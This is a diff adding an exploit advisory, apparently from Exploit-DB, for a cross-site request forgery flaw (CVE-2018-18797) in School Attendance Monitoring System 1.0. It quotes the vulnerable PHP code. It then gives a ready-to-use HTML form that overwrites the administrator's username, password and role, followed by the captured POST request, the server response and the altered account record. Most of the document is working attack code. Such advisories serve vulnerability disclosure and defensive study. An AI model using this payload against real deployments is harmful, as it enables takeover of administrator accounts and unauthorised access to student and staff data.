@@ -1,0 +1,84 @@
+# Exploit Title: School Attendance Monitoring System 1.0 - Cross-Site Request Forgery (Update Admin)
+# Dork: N/A
+# Date: 2018-10-29
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://www.sourcecodester.com/users/janobe
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/janobe/attendancemonitoring.zip
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2018-18797
+
+# POC: 
+# 1)
+# .../[PATH]/user/user/edit.php
+#02      if (!isset($_SESSION['ACCOUNT_ID'])){
+#03       redirect(web_root."index.php");
+#04      }
+#05 
+#06   @$USERID = $_GET['id'];
+#07     if($USERID==''){
+#08   redirect("index.php");
+#09 }
+#10   $user = New User();
+#11   $singleuser = $user->single_user($USERID);
+# .../[PATH]/user/controller.php
+#80 $user = New User(); 
+#81 $user->ACCOUNT_NAME 		= $_POST['U_NAME'];
+#82 $user->ACCOUNT_USERNAME		= $_POST['U_USERNAME'];
+#83 $user->ACCOUNT_PASSWORD		=sha1($_POST['U_PASS']);
+#84 $user->ACCOUNT_TYPE			= $_POST['U_ROLE'];
+#85 $user->update($_POST['USERID']);
+#86 
+#87 message("[". $_POST['U_NAME'] ."] has been updated!", "success");
+#88 redirect("index.php");
+# ...
+<html>
+<body>
+<form action="http://localhost/[PATH]/user/controller.php?action=edit" method="POST">
+<input id="USERID" name="USERID" placeholder="Account Id" type="Hidden" value="1">
+<input name="U_NAME" placeholder="Account Name" type="text" value="admin">
+
+<input name="deptid" type="hidden" value="">
+<input name="U_USERNAME" placeholder="Username" type="text" value="admin">
+
+<input name="deptid" type="hidden" value="">
+<input name="U_PASS" placeholder="Account Password" type="Password" value="">
+<input name="deptid" type="hidden" value="">
+<input id="RU_PASS" name="RU_PASS" placeholder="Re-type Password" type="Password" value="">
+
+<select name="U_ROLE" id="U_ROLE">
+<option value="Administrator">Administrator</option>
+<option value="SSG">SSG</option>
+</select> 
+<button id="save" name="save" type="submit">Save</button> 
+</body>
+</html>
+
+POST /[PATH]/user/controller.php?action=edit HTTP/1.1
+Host: 192.168.1.27
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=mrht5eahsjgrpgldk6c455ncm3
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 136
+USERID=1&U_NAME=admin_test&deptid=&U_USERNAME=admin_test&deptid=&U_PASS=admin_test&deptid=&RU_PASS=admin_test&U_ROLE=Administrator&save=
+HTTP/1.1 200 OK
+Date: Sun, 28 Oct 2018 17:57:48 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 128
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+/* `exploitdb`.`useraccounts` */
+$useraccounts = array(
+  array('ACCOUNT_ID' => '1','ACCOUNT_NAME' => 'admin_test','ACCOUNT_USERNAME' => 'admin_test','ACCOUNT_PASSWORD' => '3f72bcb53fb301af20d78d152456d901c30a43b3','ACCOUNT_TYPE' => 'Administrator','EMPID' => '1234','USERIMAGE' => 'photos/import2.png')
+);
